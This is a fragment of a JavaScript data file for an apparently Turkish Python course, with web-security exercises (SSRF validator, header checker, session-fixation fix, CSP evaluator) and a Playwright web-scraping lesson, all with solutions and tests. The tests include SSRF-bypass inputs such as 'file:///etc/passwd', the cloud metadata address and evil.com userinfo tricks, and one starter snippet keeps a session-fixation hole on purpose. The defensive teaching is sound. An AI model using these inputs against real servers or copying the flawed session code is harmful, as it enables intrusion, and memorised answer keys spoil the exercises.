        code: 'import ipaddress\nfor a in ["8.8.8.8", "10.0.0.5", "169.254.169.254", "::ffff:127.0.0.1"]:\n    print(ipaddress.ip_address(a).is_global, end=" ")\n',
        why: 'Yalnız 8.8.8.8 genel internet adresidir. 10.x özel ağ, 169.254.169.254 bağlantı-yerel (bulut meta veri servisi), ::ffff:127.0.0.1 ise IPv6 kılığındaki 127.0.0.1\'dir. is_global, bu tuzakların hepsini False sayar; adres metniyle "127." öneki aramak ise sonuncuyu kaçırırdı.'
      },
      {
        t: 'predict',
        id: 'web-guvenlik-y4',
        stage: 'Kodu oku',
        q: 'URL ayrıştırma tuzakları: bu kod ne yazdırır?',
        o: ['evil.com\nevil.com\ngood.com', 'good.com\ngood.com\ngood.com', 'good.com\nevil.com\nGOOD.com', 'evil.com\ngood.com\ngood.com'],
        a: 0,
        code: 'from urllib.parse import urlsplit\nfor u in ["http://good.com@evil.com/", "http://evil.com#@good.com", "http://GOOD.com:8080/"]:\n    print(urlsplit(u).hostname)\n',
        why: '@ işaretinden önceki kısım kullanıcı bilgisidir; gerçek ana makine evil.com\'dur. # sonrası parça (fragment) olduğu için ikinci adres de evil.com\'a gider. hostname küçük harfe çevrilir ve portu ayırır. "good.com" in url gibi metin kontrolleri bu yüzden güvenli değildir.'
      },
      {
        t: 'code',
        id: 'web-guvenlik-y5',
        stage: 'Rehberli',
        diff: 2,
        q: '<p><code>baslik_denetle(basliklar)</code> yaz: yanıt başlıklarının sözlüğünü alıp (adlar büyük/küçük harf duyarsız) eksik ya da zayıf olanlar için mesaj listesi döndürsün, şu sırayla:</p><ul><li>CSP yoksa <code>"CSP yok"</code>; varsa ve <code>\'unsafe-inline\'</code> içeriyorsa <code>"CSP unsafe-inline"</code></li><li>HSTS yoksa <code>"HSTS yok"</code>; varsa ve <code>max-age</code> 15552000\'den (180 gün) küçükse <code>"HSTS kısa"</code></li><li><code>X-Content-Type-Options</code> değeri <code>nosniff</code> değilse <code>"nosniff yok"</code></li><li><code>X-Frame-Options</code> yoksa ve CSP\'de <code>frame-ancestors</code> da yoksa <code>"çerçeve koruması yok"</code></li></ul>',
        guide: [
          'Önce anahtarları küçük harfe çevirerek yeni bir sözlük kur.',
          'CSP ve HSTS için get ile değeri al, None ise "yok" mesajı ekle.',
          'HSTS max-age değerini re.search(r"max-age=(\\d+)") ile çek.',
          'Çerçeve kontrolünde iki başlığı birlikte değerlendir.'
        ],
        example: 'import re\nb = {"Cache-Control": "max-age=600, public"}\nk = {a.lower(): v for a, v in b.items()}\nprint(int(re.search(r"max-age=(\\d+)", k["cache-control"]).group(1)))\n',
        start: 'import re\n\ndef baslik_denetle(basliklar):\n    b = {}\n    # TODO: adları küçük harfe çevir\n    sorunlar = []\n    # TODO: CSP, HSTS, nosniff, çerçeve\n    return sorunlar\n',
        sol: 'import re\n\ndef baslik_denetle(basliklar):\n    b = {a.lower(): v for a, v in basliklar.items()}\n    sorunlar = []\n    csp = b.get("content-security-policy")\n    if csp is None:\n        sorunlar.append("CSP yok")\n    elif "\'unsafe-inline\'" in csp:\n        sorunlar.append("CSP unsafe-inline")\n    hsts = b.get("strict-transport-security")\n    if hsts is None:\n        sorunlar.append("HSTS yok")\n    else:\n        m = re.search(r"max-age=(\\d+)", hsts)\n        if not m or int(m.group(1)) < 15552000:\n            sorunlar.append("HSTS kısa")\n    if b.get("x-content-type-options", "").strip().lower() != "nosniff":\n        sorunlar.append("nosniff yok")\n    if "x-frame-options" not in b and "frame-ancestors" not in (csp or ""):\n        sorunlar.append("çerçeve koruması yok")\n    return sorunlar\n',
        tests: 'iyi = {"Content-Security-Policy": "default-src \'self\'; frame-ancestors \'none\'", "Strict-Transport-Security": "max-age=31536000; includeSubDomains", "X-Content-Type-Options": "nosniff"}\nassert baslik_denetle(iyi) == [], "frame-ancestors varsa X-Frame-Options gerekmez"\nassert baslik_denetle({}) == ["CSP yok", "HSTS yok", "nosniff yok", "çerçeve koruması yok"], "Boş yanıt dört sorun"\nzayif = {"content-security-policy": "script-src \'self\' \'unsafe-inline\'", "STRICT-TRANSPORT-SECURITY": "max-age=300", "x-content-type-options": "NOSNIFF", "X-Frame-Options": "DENY"}\nassert baslik_denetle(zayif) == ["CSP unsafe-inline", "HSTS kısa"], f"Büyük/küçük harf duyarsız olmalı: {baslik_denetle(zayif)}"\n',
        hints: ['HTTP başlık adları büyük/küçük harf duyarsızdır.', 'csp None olabilir; "frame-ancestors" in (csp or "") güvenli yazımdır.', 'max-age sayısını int\'e çevirip 15552000 ile karşılaştır.'],
        why: 'Bu, securityheaders.com ve ZAP gibi tarayıcıların yaptığı pasif kontrolün özüdür. Bir duman testine ekleyip her dağıtımdan sonra prod yanıtını denetlemek, birinin yanlışlıkla başlıkları kaldırmasını yakalar.'
      },
      {
        t: 'code',
        id: 'web-guvenlik-y6',
        stage: 'Kendin yaz',
        diff: 2,
        q: '<p>SSRF koruması: <code>url_guvenli(url, cozumle, izinli_alanlar=None)</code> yaz. <code>cozumle(ad)</code> bir IP metni döndüren DNS fonksiyonudur (testte sahte), hata verirse güvensiz say. Kurallar: şema <code>http</code> ya da <code>https</code>; ana makine adı olmalı; <code>izinli_alanlar</code> verilmişse ana makine bunlardan biri ya da bir alt alanı (<code>.cdn.example</code> ile biten) olmalı; çözülen IP <code>is_global</code> olmalı; IPv4 eşlemeli IPv6 adreslerde (<code>::ffff:</code>) içteki IPv4 denetlensin. <code>True</code>/<code>False</code> döndür.</p>',
        start: 'import ipaddress\nfrom urllib.parse import urlsplit\n\ndef url_guvenli(url, cozumle, izinli_alanlar=None):\n    pass\n',
        sol: 'import ipaddress\nfrom urllib.parse import urlsplit\n\ndef url_guvenli(url, cozumle, izinli_alanlar=None):\n    p = urlsplit(url)\n    if p.scheme not in ("http", "https") or not p.hostname:\n        return False\n    ad = p.hostname\n    if izinli_alanlar is not None and not any(ad == a or ad.endswith("." + a) for a in izinli_alanlar):\n        return False\n    try:\n        ip = ipaddress.ip_address(cozumle(ad))\n    except Exception:\n        return False\n    if getattr(ip, "ipv4_mapped", None):\n        ip = ip.ipv4_mapped\n    return ip.is_global\n',
        tests: 'DNS = {"cdn.anadolu.example": "93.184.216.34", "img.cdn.anadolu.example": "93.184.216.35",\n       "ic.example": "10.0.0.5", "kotu.example": "::ffff:169.254.169.254"}\ndef coz(ad):\n    if ad in DNS:\n        return DNS[ad]\n    ipaddress.ip_address(ad)\n    return ad\nassert url_guvenli("https://cdn.anadolu.example/a.png", coz), "Genel IP\'ye çözülen ad güvenli"\nassert not url_guvenli("http://169.254.169.254/latest/meta-data/", coz), "Meta veri servisi engellenmeli"\nassert not url_guvenli("http://ic.example/admin", coz), "Ad iç IP\'ye çözülüyorsa engellenmeli"\nassert not url_guvenli("http://kotu.example/", coz), "IPv4 eşlemeli IPv6 içindeki adres denetlenmeli"\nassert not url_guvenli("file:///etc/passwd", coz), "Yalnız http/https"\nassert not url_guvenli("http://yok.example/", coz), "Çözülemeyen ad güvensiz"\nassert not url_guvenli("http://cdn.anadolu.example@10.0.0.5/", coz), "@ öncesi kullanıcı bilgisidir; gerçek hedef 10.0.0.5"\nI = ["cdn.anadolu.example"]\nassert url_guvenli("https://img.cdn.anadolu.example/x", coz, I), "Alt alan izinli"\nassert not url_guvenli("https://cdn.anadolu.example.evil.com/x", lambda a: "93.184.216.36", I), "Önek benzerliği izin vermez"\n',
        hints: ['urlsplit(url).hostname kullanıcı bilgisini ve portu ayırır.', 'İzin listesi: ad == alan ya da ad.endswith("." + alan).', 'ip.ipv4_mapped None değilse onu denetle; is_global her şeyi kapsar.'],
        why: 'Ad yerine çözülen IP\'yi denetlemek ve IPv6 kılıklarını açmak SSRF filtrelerinin en sık atlanan iki adımıdır. Gerçek istemcide denetlenen IP\'ye bağlanmak ve yönlendirmeleri kapatmak da gerekir; aksi hâlde DNS yeniden bağlama ile filtre atlatılır.'
      },
      {
        t: 'code',
        id: 'web-guvenlik-y7',
        stage: 'Hata avı',
        kind: 'bug',
        diff: 2,
        q: '<p>Hatayı bul ve düzelt. <code>OturumDeposu</code> sunucu taraflı oturumları tutuyor. <code>giris_yap(eski_kimlik, kullanici)</code> girişte oturumu yetkilendirip kullanılacak kimliği döndürmeli. Şu anki kod saldırganın önceden verdiği kimliği yetkili yapıyor (oturum sabitleme). Girişte yeni rastgele kimlik üret, eski oturumdaki veriyi (ör. sepet) yeni kimliğe taşı ve eski kimliği sil.</p>',
        start: 'import secrets\n\nclass OturumDeposu:\n    def __init__(self):\n        self.oturumlar = {}\n\n    def yeni(self):\n        k = secrets.token_urlsafe(16)\n        self.oturumlar[k] = {}\n        return k\n\n    def giris_yap(self, eski_kimlik, kullanici):\n        veri = self.oturumlar.setdefault(eski_kimlik, {})\n        veri["kullanici"] = kullanici\n        return eski_kimlik\n',
        sol: 'import secrets\n\nclass OturumDeposu:\n    def __init__(self):\n        self.oturumlar = {}\n\n    def yeni(self):\n        k = secrets.token_urlsafe(16)\n        self.oturumlar[k] = {}\n        return k\n\n    def giris_yap(self, eski_kimlik, kullanici):\n        veri = self.oturumlar.pop(eski_kimlik, {})\n        yeni = secrets.token_urlsafe(16)\n        self.oturumlar[yeni] = {**veri, "kullanici": kullanici}\n        return yeni\n',
        tests: 'd = OturumDeposu()\nsaldirgan = d.yeni()\nd.oturumlar[saldirgan]["sepet"] = [7]\nkimlik = d.giris_yap(saldirgan, "ece")\nassert kimlik != saldirgan, "Girişte oturum kimliği yenilenmeli"\nassert saldirgan not in d.oturumlar, "Eski (saldırganın bildiği) kimlik geçersiz olmalı"\nassert d.oturumlar[kimlik] == {"sepet": [7], "kullanici": "ece"}, "Sepet yeni oturuma taşınmalı"\nassert len(kimlik) >= 20, "Kimlik tahmin edilemez uzunlukta olmalı"\nk2 = d.giris_yap("hic-yok", "ali")\nassert d.oturumlar[k2] == {"kullanici": "ali"} and "hic-yok" not in d.oturumlar, "Bilinmeyen kimlik de yeni oturum açmalı"\n',
        hints: ['Sorun: girişten önce ve sonra kimlik aynı kalıyor.', 'pop ile eski veriyi al ve eski kaydı sil.', 'Yeni kimliği secrets.token_urlsafe ile üret, veriyi kopyalayıp kullanıcıyı ekle.'],
        why: 'Yetki düzeyi değiştiği an kimliği yenilemek, saldırganın önceden yerleştirdiği kimliği değersiz kılar. Django login() ve Spring Security bunu varsayılan olarak yapar; kendi oturum katmanını yazıyorsan bu senin sorumluluğundadır.'
      },
      {
        t: 'code',
        id: 'web-guvenlik-y8',
        stage: 'Meydan okuma',
        diff: 3,
        q: '<p>CSP değerlendiricisi: <code>csp_izinli(csp, tur, kaynak, sayfa_kokeni)</code> yaz. <code>csp</code> politika metni (yönergeler <code>;</code> ile ayrılır), <code>tur</code> <code>"script"</code>, <code>"img"</code> ya da <code>"style"</code>, <code>kaynak</code> tam URL ya da satır içi kod için <code>"inline"</code>. Kurallar: önce <code>&lt;tur&gt;-src</code> yönergesine bak, yoksa <code>default-src</code>\'a; ikisi de yoksa izinli. Kaynak ifadeleri: <code>\'none\'</code> (hiçbiri), <code>\'self\'</code> (kaynağın kökeni sayfa kökeniyle aynı: şema + ana makine + port), <code>\'unsafe-inline\'</code> (yalnız <code>"inline"</code>\'a izin), <code>https:</code> (her https adresi), <code>*.alan.com</code> (alt alanlar, kökün kendisi değil), tam köken <code>https://cdn.example.com</code>. <code>"inline"</code> yalnız <code>\'unsafe-inline\'</code> ile izinlidir.</p>',
        start: 'from urllib.parse import urlsplit\n\ndef csp_izinli(csp, tur, kaynak, sayfa_kokeni):\n    pass\n',
        sol: 'from urllib.parse import urlsplit\n\ndef _koken(url):\n    p = urlsplit(url)\n    port = p.port or {"http": 80, "https": 443}.get(p.scheme)\n    return (p.scheme, p.hostname, port)\n\ndef csp_izinli(csp, tur, kaynak, sayfa_kokeni):\n    yonergeler = {}\n    for parca in csp.split(";"):\n        kel = parca.split()\n        if kel:\n            yonergeler[kel[0].lower()] = kel[1:]\n    ifadeler = yonergeler.get(tur + "-src", yonergeler.get("default-src"))\n    if ifadeler is None:\n        return True\n    if kaynak == "inline":\n        return "\'unsafe-inline\'" in ifadeler\n    p = urlsplit(kaynak)\n    for ifade in ifadeler:\n        if ifade == "\'self\'" and _koken(kaynak) == _koken(sayfa_kokeni):\n            return True\n        if ifade == "https:" and p.scheme == "https":\n            return True\n        if ifade.startswith("*.") and p.hostname and p.hostname.endswith(ifade[1:]):\n            return True\n        if "://" in ifade and _koken(ifade) == _koken(kaynak):\n            return True\n    return False\n',
        tests: 'CSP = "default-src \'self\'; script-src \'self\' https://cdn.example.com *.anadolu.com; img-src https:; style-src \'self\' \'unsafe-inline\'; object-src \'none\'"\nS = "https://market.anadolu.com"\nassert csp_izinli(CSP, "script", "https://market.anadolu.com/app.js", S), "\'self\' aynı köken"\nassert csp_izinli(CSP, "script", "https://cdn.example.com/lib.js", S), "Tam köken eşleşmesi"\nassert csp_izinli(CSP, "script", "https://odeme.anadolu.com/x.js", S), "*.anadolu.com alt alanı"\nassert not csp_izinli(CSP, "script", "https://anadolu.com/x.js", S), "*. kökün kendisini kapsamaz"\nassert not csp_izinli(CSP, "script", "inline", S), "script-src unsafe-inline içermiyor"\nassert csp_izinli(CSP, "style", "inline", S), "style-src unsafe-inline içeriyor"\nassert csp_izinli(CSP, "img", "https://herhangi.net/a.png", S) and not csp_izinli(CSP, "img", "http://herhangi.net/a.png", S), "img-src https: yalnız https"\nassert not csp_izinli(CSP, "script", "http://cdn.example.com/lib.js", S), "Tam köken ifadesinde şema da eşleşmeli (http ≠ https)"\nassert not csp_izinli("default-src \'self\'", "script", "http://market.anadolu.com/app.js", S), "Şema farklıysa \'self\' değildir"\nassert csp_izinli("default-src \'self\'", "img", "https://market.anadolu.com:443/a.png", S), "Varsayılan port eşittir; default-src\'a düşülür"\nassert csp_izinli("", "script", "https://x.com/a.js", S), "Politika yoksa izinli"\n',
        hints: [
          'Politikayı {yönerge: [ifadeler]} sözlüğüne çevir; önce tur-src, yoksa default-src.',
          'Köken karşılaştırması için (şema, ana makine, port) demeti kur; port yoksa 80/443.',
          '\'none\' hiçbir koşulu sağlamadığı için kendiliğinden False verir.'
        ],
        why: 'Tarayıcı CSP\'yi tam olarak bu adımlarla uygular: önce özel yönerge, yoksa default-src. Politikayı yazmadan önce sayfanın yüklediği kaynakları bu şekilde denetlemek, Report-Only aşamasında çıkacak ihlalleri önceden görmeni sağlar.'
      }
    ],
    faq: [
      {
        q: 'CSP\'yi Nginx\'te mi uygulamalıyım, uygulamada mı?',
        a: 'Sabit başlıklar (HSTS, nosniff, X-Frame-Options) Nginx\'te tek yerde verilebilir. CSP ise sayfaya göre değişebilir ve nonce (her istekte üretilen rastgele değer) gerektirebilir; bu durumda uygulamada üretilir. İkisini birden yazarsan tarayıcı iki CSP\'yi de uygular ve en kısıtlayıcısı geçerli olur.'
      },
      {
        q: 'SSRF\'ye karşı ağ düzeyinde ne yapılabilir?',
        a: 'Dış URL çeken işi ayrı bir servis ya da konteynerde çalıştır ve bu servisin iç ağa, meta veri servisine çıkışını güvenlik grubu/ağ politikasıyla kapat. Uygulama kodundaki denetim ve ağ kuralı birlikte derinlemesine savunma oluşturur.'
      }
    ]
  }
);
})(window);
/* Kesit Python — 'web-scraping' uzantısı (AUDIT 12, Derinleş + ek alıştırmalar) */
(function (W) {
'use strict';
const X = W.PY_EXT = W.PY_EXT || [];
X.push(
  {
    id: 'web-scraping',
    min: 30,
    html: `<p>Derste Playwright'ı tek bir örnekle tanıdın: sayfayı aç, içeriği al. Gerçek otomasyon işlerinde ise asıl zorluklar başka yerdedir: sayfanın ne zaman "hazır" olduğunu bilmek, her çalıştırmada yeniden giriş yapmamak, sayfanın arkasındaki JSON API'yi bulmak ve dosya indirmek. Bu bölüm bu dört kalıbı gösteriyor; alıştırmalar ise tarayıcıda çalışan BeautifulSoup ve JSON üzerinde.</p>
<h2>Bekleme stratejileri</h2>
<p>Dinamik sayfada içerik JavaScript ile sonradan gelir. En kötü çözüm <code>time.sleep(5)</code>'tir: yavaş ağda yetmez, hızlı ağda boşa bekletir. Playwright'ın <b>locator</b> API'si eylemlerden önce elemanın görünür, etkin ve sabit olmasını kendiliğinden bekler (auto-wait); sen yalnız <b>neyi</b> beklediğini söylersin.</p>
<pre class="code">from playwright.sync_api import sync_playwright, expect

with sync_playwright() as p:
    tarayici = p.chromium.launch(headless=True)
    sayfa = tarayici.new_page()
    sayfa.goto("https://portal.example.com/siparisler", wait_until="domcontentloaded")

    satirlar = sayfa.locator("table#siparis tbody tr")
    expect(satirlar.first).to_be_visible(timeout=10_000)       # ilk satır gelene kadar
    sayfa.get_by_role("button", name="Daha fazla").click()      # tıklamadan önce kendisi bekler
    expect(satirlar).to_have_count(40)                          # 40 satır olana kadar
    sayfa.wait_for_load_state("networkidle")                    # son çare: ağ susana kadar
    print(satirlar.all_inner_texts()[:3])</pre>
<div class="tbl-wrap"><table><tr><th>Bekleme</th><th>Ne zaman?</th></tr>
<tr><td><code>expect(locator).to_be_visible()</code></td><td>Belirli bir eleman görünene kadar (en sağlam)</td></tr>
<tr><td><code>page.wait_for_response(lambda r: "/api/siparis" in r.url)</code></td><td>Belirli bir API çağrısı bitene kadar</td></tr>
<tr><td><code>wait_for_load_state("networkidle")</code></td><td>Ağda 500 ms hiçbir istek olmayana kadar; sürekli yoklama yapan sayfalarda hiç gelmeyebilir</td></tr>
<tr><td><code>time.sleep</code></td><td>Hiçbir zaman (hata ayıklarken bile <code>page.pause()</code> daha iyidir)</td></tr></table></div>
<h2>Giriş yapılan portalda oturumu saklamak</h2>
<p>Her çalıştırmada kullanıcı adı ve parola girmek yavaştır, iki aşamalı doğrulamaya takılır ve hesabı kilitletebilir. Playwright tarayıcı bağlamının çerezlerini ve localStorage'ını bir JSON dosyasına (<code>storage_state</code>) yazar; sonraki çalıştırmalar bu dosyayla giriş yapmış olarak başlar.</p>
<pre class="code">import os
DURUM = "oturum.json"           # .gitignore'a ekle: içinde oturum çerezleri var!

def baglam_ac(tarayici):
    if os.path.exists(DURUM):
        return tarayici.new_context(storage_state=DURUM)
    baglam = tarayici.new_context()
    s = baglam.new_page()
    s.goto("https://portal.example.com/giris")
    s.get_by_label("Kullanıcı adı").fill(os.environ["PORTAL_KULLANICI"])
    s.get_by_label("Parola").fill(os.environ["PORTAL_PAROLA"])
    s.get_by_role("button", name="Giriş").click()
    s.wait_for_url("**/panel")
    baglam.storage_state(path=DURUM)
    return baglam</pre>
<p>Oturum süresi dolunca (portal giriş sayfasına yönlendirince) dosyayı silip yeniden giriş yap. Çerezlerin süresini dosyadan okuyabilirsin: her çerezin <code>expires</code> alanı Unix zamanıdır (<code>-1</code>: tarayıcı kapanınca biten oturum çerezi).</p>
<h2>Ağ yanıtını yakalayıp gizli API'yi kullanmak</h2>
<p>Çoğu dinamik sayfa veriyi bir JSON uç noktasından çeker ve HTML'i tarayıcıda üretir. O JSON'u doğrudan almak, HTML'i kazımaktan çok daha sağlam ve hızlıdır: seçiciler kırılmaz, sayılar biçimlenmemiş gelir. Tarayıcının geliştirici araçlarında Ağ (Network) sekmesinde Fetch/XHR süzgeciyle bu çağrıyı bulabilir ya da Playwright ile yakalayabilirsin:</p>
<pre class="code">with sayfa.expect_response(lambda r: "/api/v1/siparisler" in r.url and r.status == 200) as bilgi:
    sayfa.get_by_role("button", name="Listele").click()
veri = bilgi.value.json()                    # {"items": [...], "next_cursor": "..."}

# Uç noktayı öğrendikten sonra aynı oturum çerezleriyle doğrudan çağır:
yanit = baglam.request.get("https://portal.example.com/api/v1/siparisler", params={"cursor": veri["next_cursor"]})</pre>
<div class="warn"><b>Gizli API de kurallara tabidir</b>Belgelenmemiş bir uç noktayı kullanmak sitenin kullanım koşullarına aykırı olabilir ve haber vermeden değişebilir. Derste gördüğün robots.txt, hız sınırı ve KVKK kuralları burada da geçerli. Resmî bir API varsa onu tercih et.</div>
<h2>Dosya indirmek</h2>
<p>Rapor dışa aktarma düğmeleri çoğunlukla bir indirme başlatır. Playwright indirmeyi bir olay olarak yakalar; dosyayı geçici bir yerden kendi klasörüne sen taşırsın. Dosya adını tarihle zenginleştir ve önce geçici ada yazıp sonra yeniden adlandır ki yarım dosya bir sonraki adımda okunmasın.</p>
<pre class="code">with sayfa.expect_download() as indirme:
    sayfa.get_by_role("link", name="Excel'e aktar").click()
dosya = indirme.value
hedef = f"indirilenler/{dosya.suggested_filename}"
dosya.save_as(hedef)</pre>
<div class="note"><b>Kendi bilgisayarında dene</b><code>pip install playwright</code> ve <code>playwright install chromium</code>. <code>playwright codegen https://site</code> komutu tarayıcıda yaptığın tıklamaları koda çevirir; seçicileri bulmak için harika bir başlangıçtır. Tarayıcı içinde Playwright çalışmaz; aşağıdaki alıştırmalar kazınan HTML ve yakalanan JSON üzerinde çalışır.</div>
<div class="note"><b>Gerçek işte</b>Otomasyon ekiplerinde tipik iş, tedarikçi ya da kamu portalından her sabah rapor indirmektir. Sağlam bir çözümün işaretleri: sleep yok, oturum dosyası saklanıyor ve süresi denetleniyor, veri mümkünse JSON'dan alınıyor, dosya adları tarihle ve atomik olarak kaydediliyor, her adım loglanıyor.</div>`,
    ex: [
      {
        t: 'mc',
        id: 'web-scraping-y1',
        stage: 'Isınma',
        q: 'Playwright betiğin bazen boş tablo okuyor. Şu an <code>sayfa.goto(url)</code> sonrasında <code>time.sleep(2)</code> var. En sağlam düzeltme hangisi?',
        o: [
          'Beklemeyi <code>time.sleep(10)</code> yapıp güvenli tarafta kalmak',
          'İlk satır görünene kadar <code>expect(...).to_be_visible()</code>',
          'Tablo dolana kadar sayfayı üç kez yeniden yüklemek',
          'Betiği <code>headless=False</code> ile görünür tarayıcıda çalıştırmak'
        ],
        a: 1,
        why: 'Sabit bekleme ağ hızına bağlıdır; ya yetmez ya boşa bekletir. Beklemeyi bir koşula (eleman görünür, sayı şu kadar, belirli API yanıtı geldi) bağlamak hem hızlı hem güvenilirdir. headless kipinin bekleme ile ilgisi yoktur.'
      },
      {
        t: 'mc',
        id: 'web-scraping-y2',
        stage: 'Isınma',
        q: 'Kaydedilen <code>storage_state</code> dosyası (oturum.json) için doğru yaklaşım hangisi?',
        o: [
          'Ekip arkadaşları da kullansın diye depoya commit etmek',
          'Parola gibi korumak: .gitignore\'a ekleyip süresi dolunca yenilemek',
          'Her çalıştırmadan sonra ekibe e-postayla yedeğini göndermek',
          'İçindeki çerezleri kopyalayıp betiğin koduna sabit yazmak'
        ],
        a: 1,
        why: 'Dosya oturum çerezlerini içerir; ele geçiren kişi parolaya gerek duymadan hesaba girer. Parola gibi korunmalı, depoya girmemeli ve oturum süresi dolunca yeniden üretilmelidir.'
      },
      {
        t: 'predict',
        id: 'web-scraping-y3',
        stage: 'Kodu oku',
        q: 'Bu kod ne yazdırır?',
        o: ['[\'AM-1\'] 3', '[\'AM-1\'] 2', '[\'AM-1\', \'AM-2\'] 3', '[] 3'],
        a: 0,
        code: 'from bs4 import BeautifulSoup\nhtml = """<table id="s"><tr><th>No</th><th>Tutar</th></tr>\n<tr data-durum="kargoda"><td>AM-1</td><td>1.250,50 TL</td></tr>\n<tr data-durum="iptal"><td>AM-2</td><td>80,00 TL</td></tr></table>"""\nsoup = BeautifulSoup(html, "html.parser")\nprint([tr.td.text for tr in soup.select("tr[data-durum=\'kargoda\']")], len(soup.select("tr")))\n',
        why: 'Öznitelik seçici [data-durum=\'kargoda\'] yalnız ilk veri satırını seçer; tr.td o satırdaki ilk hücredir. Başlık satırı da bir tr olduğu için toplam 3 satır vardır.'
      },
      {
        t: 'order',
        id: 'web-scraping-y4',
        stage: 'Kodu oku',
        q: '<p>Yakalanan API yanıtından teslim edilen siparişlerin toplamını hesaplayan programın satırlarını sırala. Beklenen çıktı:</p><pre class="out">2 1330.5</pre>',
        lines: [
          'import json',
          'yanit = \'{"items": [{"no": "AM-1", "durum": "teslim", "tutar": 1250.5}, {"no": "AM-2", "durum": "iptal", "tutar": 80}, {"no": "AM-3", "durum": "teslim", "tutar": 80}]}\'',
          'veri = json.loads(yanit)',
          'teslim = [x for x in veri["items"] if x["durum"] == "teslim"]',
          'print(len(teslim), sum(x["tutar"] for x in teslim))'
        ],
        expect: '2 1330.5\n',
        hint: 'Metin önce JSON\'a çevrilmeli; süzme ondan sonra.',
        why: 'API yanıtında sayılar zaten sayıdır: "1.250,50 TL" gibi biçimlenmiş metni ayrıştırma derdi yoktur. Gizli API\'yi kullanmanın en büyük kazancı budur.'
      },
      {
        t: 'code',
        id: 'web-scraping-y5',
        stage: 'Rehberli',
        diff: 2,
        q: '<p>Portaldan kazınan sipariş tablosunu ayrıştır: <code>tablo_oku(html)</code> yaz. Tablo <code>table#siparis</code>; ilk satır başlıktır (<code>th</code>). Her veri satırını başlık adlarını anahtar yapan sözlüğe çevir. <code>Tutar</code> sütunu <code>"1.250,50 TL"</code> biçiminde; float\'a çevir. Hücre metinlerini kırp. Hücre sayısı başlıkla tutmayan satırları atla.</p>',
        guide: [
          'soup.select_one("table#siparis") ile tabloyu, select("tr") ile satırları al.',
          'İlk satırın th metinlerinden başlık listesini kur.',
          'Diğer satırlarda td metinlerini get_text(strip=True) ile al; uzunluk tutmuyorsa geç.',
          'Tutar\'ı "TL", "." ve "," dönüşümüyle float yap; dict(zip(...)) ile sözlük kur.'
        ],
        example: 'from bs4 import BeautifulSoup\ns = BeautifulSoup("<ul><li> a </li><li>b</li></ul>", "html.parser")\nprint([li.get_text(strip=True) for li in s.select("li")])\nprint(float("2.040,75".replace(".", "").replace(",", ".")))\n',
        start: 'from bs4 import BeautifulSoup\n\ndef tablo_oku(html):\n    soup = BeautifulSoup(html, "html.parser")\n    satirlar = soup.select_one("table#siparis").select("tr")\n    basliklar = []\n    # TODO: başlıklar\n    kayitlar = []\n    # TODO: veri satırları ve Tutar dönüşümü\n    return kayitlar\n',
        sol: 'from bs4 import BeautifulSoup\n\ndef tablo_oku(html):\n    soup = BeautifulSoup(html, "html.parser")\n    satirlar = soup.select_one("table#siparis").select("tr")\n    basliklar = [th.get_text(strip=True) for th in satirlar[0].select("th")]\n    kayitlar = []\n    for tr in satirlar[1:]:\n        hucreler = [td.get_text(strip=True) for td in tr.select("td")]\n        if len(hucreler) != len(basliklar):\n            continue\n        k = dict(zip(basliklar, hucreler))\n        k["Tutar"] = float(k["Tutar"].replace("TL", "").strip().replace(".", "").replace(",", "."))\n        kayitlar.append(k)\n    return kayitlar\n',
        tests: 'H = """<html><body><table id="ozet"><tr><td>yok say</td></tr></table>\n<table id="siparis">\n<tr><th>No</th><th>Şehir</th><th>Tutar</th></tr>\n<tr><td> AM-101 </td><td>İzmir</td><td>1.250,50 TL</td></tr>\n<tr><td>AM-102</td><td>Ankara</td><td>80,00 TL</td></tr>\n<tr><td colspan="3">Toplam: 1.330,50 TL</td></tr>\n<tr><td>AM-103</td><td>Bursa</td><td>12.040,00 TL</td></tr>\n</table></body></html>"""\nk = tablo_oku(H)\nassert len(k) == 3, f"Toplam satırı atlanmalı, 3 kayıt beklenir: {len(k)}"\nassert k[0] == {"No": "AM-101", "Şehir": "İzmir", "Tutar": 1250.5}, f"İlk kayıt: {k[0]}"\nassert k[2]["Tutar"] == 12040.0, "Binlik ayırıcı nokta kaldırılmalı"\n',
        hints: [
          'Başlık ve hücre sayısını karşılaştırarak özet/toplam satırlarını ele.',
          'Türkçe sayı: önce binlik noktaları sil, sonra virgülü noktaya çevir.',
          'k["Tutar"] = float(k["Tutar"].replace("TL", "").strip().replace(".", "").replace(",", "."))'
        ],
        why: 'Başlıkları HTML\'den okumak, sütun sırası değişse bile kodu çalışır tutar. Toplam satırı gibi yapısı farklı satırları hücre sayısıyla elemek de kazıyıcıyı sağlamlaştırır.'
      },
      {
        t: 'code',
        id: 'web-scraping-y6',
        stage: 'Kendin yaz',
        diff: 2,
        q: '<p>Oturum dosyası hâlâ geçerli mi? <code>oturum_gecerli(durum_json, alan, simdi, pay_sn=300)</code> yaz. <code>durum_json</code> Playwright\'ın <code>storage_state</code> metnidir: <code>{"cookies": [{"name", "domain", "expires", ...}], "origins": [...]}</code>. <code>alan</code> için (çerezin <code>domain</code>\'i alanla aynıysa ya da <code>"." + alan</code> ise, ya da alan çerez alanının alt alanıysa) <code>name</code>\'i <code>"oturum"</code> olan çerezi bul. Çerez yoksa <code>False</code>; <code>expires</code> <code>-1</code> ise (tarayıcı oturumu) <code>False</code> (betik yeni süreçte açılınca geçersizdir); aksi hâlde <code>expires</code> <code>simdi + pay_sn</code>\'den büyükse <code>True</code>.</p>',
        start: 'import json\n\ndef oturum_gecerli(durum_json, alan, simdi, pay_sn=300):\n    pass\n',
        sol: 'import json\n\ndef oturum_gecerli(durum_json, alan, simdi, pay_sn=300):\n    durum = json.loads(durum_json)\n    for c in durum.get("cookies", []):\n        d = c.get("domain", "").lstrip(".")\n        if c.get("name") == "oturum" and (alan == d or alan.endswith("." + d)):\n            if c.get("expires", -1) == -1:\n                return False\n            return c["expires"] > simdi + pay_sn\n    return False\n',
